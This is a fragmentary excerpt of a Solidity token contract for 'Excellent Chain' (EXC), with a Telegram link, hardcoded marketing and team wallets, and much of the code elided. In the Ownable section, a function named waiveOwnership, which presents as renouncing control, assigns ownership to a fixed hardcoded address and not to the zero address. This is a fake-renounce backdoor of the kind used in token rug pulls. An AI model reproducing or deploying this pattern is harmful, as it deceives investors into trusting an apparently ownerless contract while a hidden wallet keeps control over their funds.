...
/**
Telegram : https://t.me/excellentchainannouncement
Website : TBA
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xd4142111f6583ff1778535A90dab50aBC830F383);
    }
...
contract excellentchain is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Excellent Chain";
    string private _symbol = "EXC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xd5bEFD270E4046Ef8826facC498C7A53AA8327E4);
    address payable public teamWalletAddress = payable(0xd5bEFD270E4046Ef8826facC498C7A53AA8327E4);
